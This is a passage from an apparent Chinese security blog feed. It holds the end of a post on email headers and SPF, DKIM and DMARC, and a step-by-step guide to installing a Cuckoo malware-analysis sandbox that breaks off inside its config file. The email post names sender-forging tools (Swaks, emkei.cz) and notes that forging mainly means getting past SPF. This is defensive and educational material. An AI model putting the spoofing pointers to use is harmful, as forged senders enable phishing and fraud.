class="hljs-operator">+</span>ae0TNsnimf5XNvgf7nNKh3QBpPNAqcpcX<span class="hljs-operator">/</span>ZyfKN2a0ilv9dYIDdDK<span class="hljs-operator">+</span>fvn2s3S7yU56Kg<br> d2i<span class="hljs-operator">/</span>oqpuKGhMcjc1dtfGsPUBbJPeZ4s4n0Uulk13JQ8<span class="hljs-operator">/</span>I9eQYnX8pfTKKQtOU58YDCdsB1ldK<br> Lf69wz9eZkOCmdblg7CiKWBYyEP3KH3M3rn5CMV3nUBkzAa9HeD8K<span class="hljs-operator">/</span>nhzy22W6b7VvPpoerPQZlz<br> mkalKUtE0Vehm3mRjaPxFS76wltuS<span class="hljs-operator">+</span>rZDNZdCGCsq87EGAx3rufnU<span class="hljs-operator">/</span>VUGnstEGAXaEkRVQQNvYlR<br> t4dLhAPmyloPkRVrfm2phqcMX1sinOCYsdbGly104lAmuAYvcwjlj2OjKcdnuImHHvZvn<span class="hljs-operator">/</span><span class="hljs-number">9</span>c6k7o<br> <span class="hljs-number">7</span>XsYqUau4PE2iBXFQiW6XWB8grGkrhfZA08UmCOfcX<span class="hljs-operator">+</span>K8b6yF4duYz2NwlClRSLJMmOwxeLJowwt<br> Ar8mrXQqSc2qT4q96fd2lJ9FeFglMUr4Ks8wfwg2o<span class="hljs-operator">=</span><br>DKIM<span class="hljs-operator">-</span>Signature: v<span class="hljs-operator">=</span><span class="hljs-number">1</span>; a<span class="hljs-operator">=</span>rsa<span class="hljs-operator">-</span>sha256; c<span class="hljs-operator">=</span>relaxed<span class="hljs-operator">/</span>relaxed; d<span class="hljs-operator">=</span><span class="hljs-number">163.</span>com;<br>s<span class="hljs-operator">=</span>s110527; h<span class="hljs-operator">=</span><span class="hljs-keyword">from</span>:subject:Message<span class="hljs-operator">-</span>Id:<span class="hljs-type">Date</span>; bh<span class="hljs-operator">=</span><span class="hljs-number">47</span>DEQpj8HBSa<span class="hljs-operator">+</span><span class="hljs-operator">/</span>TImW<br><span class="hljs-operator">+</span><span class="hljs-number">5</span>JCeuQeRkm5NMpJWZG3hSuFU<span class="hljs-operator">=</span>; b<span class="hljs-operator">=</span>Kn0WpC2fucvFEITjTBzH0DMH<span class="hljs-operator">/</span>w3ZnZW<span class="hljs-operator">/</span>GO<br>gAL2NJ5irkDwC38UJSmLy5dcL2rBz4end0AI0tExHAdyH<span class="hljs-operator">+</span>nSOwad5EzbLC5z6<span class="hljs-operator">/</span>zL<br>y2jlOxNKoviahCyJX1SZkx7ojGSKXWxDoAEGWjzTAj3PhdEaXvO4Ky3pprqlmqAk<br>XHM2Yj9ec<span class="hljs-operator">=</span><br>Received: <span class="hljs-keyword">from</span> <span class="hljs-number">163</span> (<span class="hljs-literal">unknown</span> [<span class="hljs-number">125.133</span><span class="hljs-number">.194</span><span class="hljs-number">.12</span>])<br><span class="hljs-keyword">by</span> smtp5 (Coremail) <span class="hljs-keyword">with</span> SMTP id WHdxpCgAHrJEg66Rix6upg<span class="hljs-comment">--.2754752;</span><br>Mon, <span class="hljs-number">24</span> Apr <span class="hljs-number">2021</span> <span class="hljs-number">14</span>:<span class="hljs-number">16</span>:<span class="hljs-number">30</span> <span class="hljs-operator">+</span><span class="hljs-number">0800</span> (CST)<br><span class="hljs-keyword">from</span>: <span class="hljs-operator">&lt;</span>test<span class="hljs-variable">@163</span>.com<span class="hljs-operator">&gt;</span><br><span class="hljs-keyword">to</span>: <span class="hljs-operator">&lt;</span>test<span class="hljs-variable">@qq</span>.com<span class="hljs-operator">&gt;</span><br>subject: this <span class="hljs-keyword">is</span> a subject<br><span class="hljs-number">123</span><br>X<span class="hljs-operator">-</span>CM<span class="hljs-operator">-</span>TRANSID:HdxpCgddAHVJEg62Rix6upCg<span class="hljs-comment">--.27507S2</span><br>Message<span class="hljs-operator">-</span>Id:<span class="hljs-operator">&lt;</span><span class="hljs-number">626413243</span>B51.B4E4C<span class="hljs-number">.1381</span><span class="hljs-variable">@mail</span><span class="hljs-operator">-</span>m975.mail<span class="hljs-number">.163</span>.com<span class="hljs-operator">&gt;</span><br>X<span class="hljs-operator">-</span>Coremail<span class="hljs-operator">-</span>Antispam: <span class="hljs-number">1</span>Uf129KBjeUn29KB7ZKAUJUUUUU529EdanIcx71UUUUU7v73<br>VFW2AGmfu7123jm3AaLaJ3U3IYCTnIWIevJa73UjIFyTuYv333Dg18DUUUU<br>X<span class="hljs-operator">-</span>Originating<span class="hljs-operator">-</span>IP: [<span class="hljs-number">125.133</span><span class="hljs-number">.194</span><span class="hljs-number">.12</span>]<br><span class="hljs-type">Date</span>: Mon, <span class="hljs-number">24</span> Apr <span class="hljs-number">2021</span> <span class="hljs-number">14</span>:<span class="hljs-number">16</span>:<span class="hljs-number">51</span> <span class="hljs-operator">+</span><span class="hljs-number">0800</span> (CST)<br>X<span class="hljs-operator">-</span>CM<span class="hljs-operator">-</span>SenderInfo: xdqr05tpbxqidywtou0bp<span class="hljs-operator">/</span>xtbBrRLsU175e3K11gAAsi<br><br></code></pre></td></tr></table></figure><p><strong>使用telnet发送邮件</strong></p><img src="屏幕截图 2022-04-24 141829.png" alt="屏幕截图 2022-04-24 141829" style="zoom:50%;" /><p><strong>常见邮件属性</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Mail From:</span>                 <span class="hljs-comment">#发件人，一般在收件人方不显示</span><br><span class="hljs-attr">Rcpt to:</span>                   <span class="hljs-comment">#收件人，一般在收件人方不显示</span><br><span class="hljs-attr">Received:</span>                  <span class="hljs-comment">#表示路由信息，记录了邮件传递过程</span><br><span class="hljs-attr">Sender:</span>                    <span class="hljs-comment">#代发用户</span><br><span class="hljs-attr">DKIM-Signature:</span>            <span class="hljs-comment">#DKIM签名</span><br><span class="hljs-attr">From:</span>                      <span class="hljs-comment">#data中的发件人           </span><br><span class="hljs-attr">To:</span>                        <span class="hljs-comment">#data中的收件人</span><br><span class="hljs-attr">Subject:</span>                   <span class="hljs-comment">#主题</span><br><span class="hljs-attr">Authentication-Results:</span>    <span class="hljs-comment">#认证结果</span><br></code></pre></td></tr></table></figure><p>一般情况下Mail From一定为登陆的邮箱账户，各个邮件服务商都会检验；Rcpt to为邮件的真实收件人。</p><p>From和TO是DATA中的数据，可以修改，但是正规邮件服务商（例如163等）会对From进行校验。</p><p>常用的邮件伪造工具<a href="http://www.jetmore.org/john/code/swaks/">Swaks</a>（Kali自带）</p><p>在线：<a href="https://emkei.cz/">https://emkei.cz/</a></p><h2 id="邮箱的验证机制"><a href="#邮箱的验证机制" class="headerlink" title="邮箱的验证机制"></a>邮箱的验证机制</h2><h3 id="SPF"><a href="#SPF" class="headerlink" title="SPF"></a>SPF</h3><p>即“Sender Policy Framework”，发送方策略框架。是一种以IP地址认证电子邮件发件人身份的技术，是非常高效的垃圾邮件解决方案。相对于其他两种验证方式，SPF验证在邮箱分辨垃圾邮件的权重<strong>最高</strong>，<strong>发件人伪造主要是如何绕过SPF记录</strong>。</p><p>接收邮件方会首先检查域名的SPF记录，来确定发件人的IP地址是否被包含在SPF记录里面，如果在，就认为是一封正确的邮件，否则会认为是一封伪造的邮件进行退回。</p><p><img src="/2022/04/24/%E5%85%B3%E4%BA%8E%E9%82%AE%E4%BB%B6%E7%9A%84%E9%82%A3%E7%82%B9%E4%BA%8B/image-20220424151500716.png" alt="image-20220424151500716"></p><h3 id="DKIM"><a href="#DKIM" class="headerlink" title="DKIM"></a>DKIM</h3><p>即“DomainKeys Identified Mail”，域名密钥识别邮件标准。</p><p>邮件发送服务器会为发出的每一封邮件添加数字签名，接收服务器会请求DKIM域名下的公钥，通过该公钥来验证邮件是否真实，以及在传输过程中是否被伪造或更改。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">DKIM-Signature: <span class="hljs-attribute">v</span>=1; <span class="hljs-attribute">a</span>=rsa-sha256; <span class="hljs-attribute">c</span>=relaxed/relaxed; <span class="hljs-attribute">d</span>=163.com;<br><span class="hljs-attribute">s</span>=s110527; <span class="hljs-attribute">h</span>=from:subject:Message-Id:Date; <span class="hljs-attribute">bh</span>=47DEQpj8HBSa+/TImW<br>+<span class="hljs-attribute">5JCeuQeRkm5NMpJWZG3hSuFU</span>=; <span class="hljs-attribute">b</span>=Kn0WpC2fucvFEITjTBzH0DMH/w3ZnZW/GO<br>gAL2NJ5irkDwC38UJSmLy5dcL2rBz4end0AI0tExHAdyH+nSOwad5EzbLC5z6/zL<br>y2jlOxNKoviahCyJX1SZkx7ojGSKXWxDoAEGWjzTAj3PhdEaXvO4Ky3pprqlmqAk<br>XHM2Yj9ec=<br></code></pre></td></tr></table></figure><h3 id="DMARC"><a href="#DMARC" class="headerlink" title="DMARC"></a>DMARC</h3><p>即“ Domain-based Message Authentication, Reporting and Conformance”，基于域名的消息身份验证、报告和一致性。基于SPF和DKIM，检查SPF和DKIM是否通过，如果不通过时怎么做。</p><h3 id=""><a href="#" class="headerlink" title=""></a><img src="/2022/04/24/%E5%85%B3%E4%BA%8E%E9%82%AE%E4%BB%B6%E7%9A%84%E9%82%A3%E7%82%B9%E4%BA%8B/dmarc.png" alt="img"></h3><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/network/327768.html">https://www.freebuf.com/articles/network/327768.html</a></p><p><a href="https://bbs.ichunqiu.com/thread-55388-1-1.html">https://bbs.ichunqiu.com/thread-55388-1-1.html</a></p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>邮件</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搭建简单的Cuckoo沙箱</title>
    <link href="/2022/04/19/%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84Cuckoo%E6%B2%99%E7%AE%B1/"/>
    <url>/2022/04/19/%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84Cuckoo%E6%B2%99%E7%AE%B1/</url>
    
    <content type="html"><![CDATA[<p>碰见一个厂商的沙箱设备直接拿来cuckoo的web界面，明目张胆啊</p><p>虽然国内很多厂商的沙箱都是基于开源的cuckoo进行二次开发的</p><p>去年（21年）4月Cuckoo Sandbox 2.x已经不维护了，确实都这么多年了，各种包也老了，至今都不支持python3。说是要完全重写，也不知道要等到什么时候。</p><p>重温一下搭建过程吧</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/cuckoosandbox/cuckoo">https://github.com/cuckoosandbox/cuckoo</a></p><p><a href="https://docs.cuckoosandbox.org/en/latest/">https://docs.cuckoosandbox.org/en/latest/</a></p><p><a href="https://blog.csdn.net/qq_38990949/article/details/103336089">https://blog.csdn.net/qq_38990949/article/details/103336089</a></p><p><a href="https://blog.csdn.net/m0_46687377/article/details/122047047">https://blog.csdn.net/m0_46687377/article/details/122047047</a></p><h2 id="Host配置"><a href="#Host配置" class="headerlink" title="Host配置"></a>Host配置</h2><h3 id="在Vmware中安装Ubuntu系统"><a href="#在Vmware中安装Ubuntu系统" class="headerlink" title="在Vmware中安装Ubuntu系统"></a>在Vmware中安装Ubuntu系统</h3><p><a href="http://releases.ubuntu.com/16.04/">Ubuntu下载</a>推荐使用 16.04</p><p>VMware安装Ubuntu时建议内存、处理器、硬盘设置大一点（尤其是硬盘，后期扩盘很麻烦）。</p><h3 id="修改源"><a href="#修改源" class="headerlink" title="修改源"></a>修改源</h3><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">sudo gedit /etc/apt/sources.list<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs awk">deb-src http:<span class="hljs-regexp">//</span>archive.ubuntu.com/ubuntu xenial main restricted<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial main restricted<br>deb-src http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial main restricted multiverse universe<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-updates main restricted<br>deb-src http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-updates main restricted multiverse universe<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial universe<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-updates universe<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial multiverse<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-updates multiverse<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-backports main restricted universe multiverse<br>deb-src http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-backports main restricted universe multiverse<br>deb http:<span class="hljs-regexp">//</span>archive.canonical.com/ubuntu xenial partner<br>deb-src http:<span class="hljs-regexp">//</span>archive.canonical.com/ubuntu xenial partner<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-security main restricted<br>deb-src http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-security main restricted multiverse universe<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-security universe<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-security multiverse<br></code></pre></td></tr></table></figure><p>然后更新</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get update &amp;&amp; apt-get upgrade<br></code></pre></td></tr></table></figure><h3 id="依次获取软件包"><a href="#依次获取软件包" class="headerlink" title="依次获取软件包"></a>依次获取软件包</h3><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs q">sudo apt-<span class="hljs-built_in">get</span> install python python-pip python-<span class="hljs-built_in">dev</span> libffi-<span class="hljs-built_in">dev</span> libssl-<span class="hljs-built_in">dev</span><br>sudo apt-<span class="hljs-built_in">get</span> install python-virtualenv python-setuptools<br>sudo apt-<span class="hljs-built_in">get</span> install libjpeg-<span class="hljs-built_in">dev</span> zlib1g-<span class="hljs-built_in">dev</span> swig<br></code></pre></td></tr></table></figure><h3 id="安装MongoDB"><a href="#安装MongoDB" class="headerlink" title="安装MongoDB"></a>安装MongoDB</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs anzhuang">sudo apt-get install mongodb<br></code></pre></td></tr></table></figure><h3 id="安装PostgreSQL"><a href="#安装PostgreSQL" class="headerlink" title="安装PostgreSQL"></a>安装PostgreSQL</h3><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">sudo apt-<span class="hljs-built_in">get</span> install postgresql libpq-<span class="hljs-built_in">dev</span><br></code></pre></td></tr></table></figure><h3 id="下载VirtualBox，并安装"><a href="#下载VirtualBox，并安装" class="headerlink" title="下载VirtualBox，并安装"></a>下载<a href="https://www.virtualbox.org/wiki/Download_Old_Builds_6_0">VirtualBox</a>，并安装</h3><p>注意：官方文档表示<strong>Cuckoo 支持 VirtualBox 4.3、5.0、5.1 和 5.2</strong>，作者使用的是6.0版本。<strong>VirtualBox位数要和Ubuntu保持一致</strong>。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> dpkg -i virtualbox-<span class="hljs-number">6</span>.<span class="hljs-number">0</span>_6.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>-<span class="hljs-number">130520</span>~Ubuntu~xenial_amd64.deb<br></code></pre></td></tr></table></figure><p>如果报错提示 Package libsdl1.2debian is not installed，如下图</p><p><img src="/2022/04/19/%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84Cuckoo%E6%B2%99%E7%AE%B1/image-20220419100554521.png" alt="image-20220419100554521"></p><p>安装libsdl1.2debian后，再次执行安装Virtualbox</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install libsdl1.2debian<br></code></pre></td></tr></table></figure><p>执行virtualbox弹出Virtualbox界面，安装成功</p><p><img src="/2022/04/19/%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84Cuckoo%E6%B2%99%E7%AE%B1/image-20220419101059442.png" alt="image-20220419101059442"></p><h3 id="安装Tcpdump"><a href="#安装Tcpdump" class="headerlink" title="安装Tcpdump"></a>安装Tcpdump</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install tcpdump apparmor-utils<br>sudo aa-<span class="hljs-built_in">disable</span> /usr/sbin/tcpdump<br></code></pre></td></tr></table></figure><h3 id="安装-M2Crypto"><a href="#安装-M2Crypto" class="headerlink" title="安装 M2Crypto"></a>安装 M2Crypto</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> pip install m2crypto==<span class="hljs-number">0</span>.<span class="hljs-number">24</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="安装Cuckoo"><a href="#安装Cuckoo" class="headerlink" title="安装Cuckoo"></a>安装Cuckoo</h3><p>更新pip，然后安装Cuckoo（因为要下载很多包，所以时间会长一点）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -m pip install --user --upgrade pip==<span class="hljs-number">20</span>.<span class="hljs-number">2</span>.<span class="hljs-number">4</span><br><span class="hljs-attribute">pip</span> install -U cuckoo<br></code></pre></td></tr></table></figure><p>执行cuckoo弹出Cuckoo界面，安装成功</p><p><img src="/2022/04/19/%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84Cuckoo%E6%B2%99%E7%AE%B1/image-20220419104409949.png" alt="image-20220419104409949"></p><h3 id="创建Cuckoo-Working-Directory"><a href="#创建Cuckoo-Working-Directory" class="headerlink" title="创建Cuckoo Working Directory"></a>创建Cuckoo Working Directory</h3><p>注：因为cuckoo用户创建虚拟机时就存在且设为sudo，官方文档中创建用户设置sudo权限没有必要了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo mkdir /opt/cuckoo<br>sudo chown cuckoo:cuckoo /opt/cuckoo<br><span class="hljs-meta prompt_"># </span><span class="language-bash">cuckoo -cwd 可以将工作路径切换到/opt/cuckoo这个目录下，这样在这个目录下就可以看到所有的配置文件</span><br>cuckoo --cwd /opt/cuckoo<br></code></pre></td></tr></table></figure><h3 id="配置网卡以及IP转发"><a href="#配置网卡以及IP转发" class="headerlink" title="配置网卡以及IP转发"></a>配置网卡以及IP转发</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 创建一张网卡</span><br>vboxmanage hostonlyif create<br>vboxmanage hostonlyif ipconfig vboxnet0 <span class="hljs-params">--ip</span> 192.168.56.1<br><br><span class="hljs-comment"># 设置host与guest的转发规则</span><br><span class="hljs-comment"># 注意网卡与你的电脑的网卡是否对应 ifconfig可查看对应网卡</span><br>iptables -A FORWARD -o ens32 -i vboxnet0 -s 192.168.56.0/24 -m conntrack <span class="hljs-params">--ctstate</span> NEW -j ACCEPT<br>iptables -A FORWARD -m conntrack <span class="hljs-params">--ctstate</span> ESTABLISHED,RELATED -j ACCEPT<br>iptables -A POSTROUTING -t nat -j MASQUERADE<br><br><span class="hljs-comment"># 开启转发</span><br><span class="hljs-keyword">echo</span> 1 &gt; <span class="hljs-string">/proc/sys/net/ipv4/ip_forward</span><br></code></pre></td></tr></table></figure><h2 id="Guest配置"><a href="#Guest配置" class="headerlink" title="Guest配置"></a>Guest配置</h2><h3 id="VirtualBox新建windows-7虚拟机"><a href="#VirtualBox新建windows-7虚拟机" class="headerlink" title="VirtualBox新建windows 7虚拟机"></a>VirtualBox新建windows 7虚拟机</h3><p>安装增强工具，并安装python2.7</p><p><img src="/2022/04/19/%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84Cuckoo%E6%B2%99%E7%AE%B1/image-20220419130731226.png" alt="image-20220419130731226"></p><p>配置pip环境变量，安装Pillow</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> pillow<br></code></pre></td></tr></table></figure><p>关闭防火墙和自动更新，设置共享文件夹</p><p><img src="/2022/04/19/%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84Cuckoo%E6%B2%99%E7%AE%B1/image-20220419133842806.png" alt="image-20220419133842806"></p><p>将Ubuntu中&#x2F;opt&#x2F;cuckoo&#x2F;agent&#x2F;agent.py重命名为agent.pyw放到C:\Users\[USER]\AppData\Roaming\MicroSoft\Windows\Start Menu\Programs\Startup\路径下</p><p><img src="/2022/04/19/%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84Cuckoo%E6%B2%99%E7%AE%B1/image-20220419134212728.png" alt="image-20220419134212728"></p><p>设置win7虚拟机网络为仅主机模式，设置ipv4属性，确定host和guest可以互相ping通</p><p><img src="/2022/04/19/%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84Cuckoo%E6%B2%99%E7%AE%B1/image-20220419134720201.png" alt="image-20220419134720201"></p><p>重启后（重启是为了让agent.pyw自启动，也可以手动启动，<strong>但是agent必须在管理员权限下运行</strong>，不然cuckoo会报错），拍设快照Snapshot 1</p><h2 id="修改Cuckoo配置文件"><a href="#修改Cuckoo配置文件" class="headerlink" title="修改Cuckoo配置文件"></a>修改Cuckoo配置文件</h2><p>需要修改的包括&#x2F;home&#x2F;cuckoo{ubuntu用户名}&#x2F;.cuckoo&#x2F;conf 目录下的cuckoo.conf、auxiliary.conf、virtualbox.conf</p><h3 id="cuckoo-conf"><a href="#cuckoo-conf" class="headerlink" title="cuckoo.conf"></a>cuckoo.conf</h3><p>基本不需要修改</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><code class="hljs makefile">[cuckoo]<br><span class="hljs-comment"># Enable or disable startup version check. When enabled, Cuckoo will connect</span><br><span class="hljs-comment"># to a remote location to verify whether the running version is the latest</span><br><span class="hljs-comment"># one available.</span><br>version_check = yes<br><br><span class="hljs-comment"># Cuckoo will stop at startup if the version check reports vulnerabilities in</span><br><span class="hljs-comment"># one of Cuckoo&#x27;s dependencies. This setting ignores the vulnerabilities</span><br><span class="hljs-comment"># and starts anyway</span><br>ignore_vulnerabilities = no<br><br><span class="hljs-comment"># The authentication token that is required to access the Cuckoo API, using</span><br><span class="hljs-comment"># HTTP Bearer authentication. This will protect the API instance against</span><br><span class="hljs-comment"># unauthorized access and CSRF attacks. It is strongly recommended to set this</span><br><span class="hljs-comment"># to a secure value.</span><br>api_token = HGiyE0KMWo1-0FZpvRCZnw<br><br><span class="hljs-comment"># The Web secret is used as a very basic, but successful way to provide basic</span><br><span class="hljs-comment"># authentication to the Cuckoo Web Interface. This is a shared secret amongst</span><br><span class="hljs-comment"># all users of this Cuckoo instance and will &quot;protect&quot; usage from users outside</span><br><span class="hljs-comment"># of this instance. Therefore, if you&#x27;d like to share this Cuckoo instance with</span><br><span class="hljs-comment"># the outside world, then don&#x27;t use the Web secret functionality.</span><br>web_secret = <br><br><span class="hljs-comment"># If turned on, Cuckoo will delete the original file after its analysis</span><br><span class="hljs-comment"># has been completed.</span><br>delete_original = no<br><br><span class="hljs-comment"># If turned on, Cuckoo will delete the copy of the original file in the</span><br><span class="hljs-comment"># local binaries repository after the analysis has finished. (On *nix this</span><br><span class="hljs-comment"># will also invalidate the file called &quot;binary&quot; in each analysis directory,</span><br><span class="hljs-comment"># as this is a symlink.)</span><br>delete_bin_copy = no<br><br><span class="hljs-comment"># Specify the 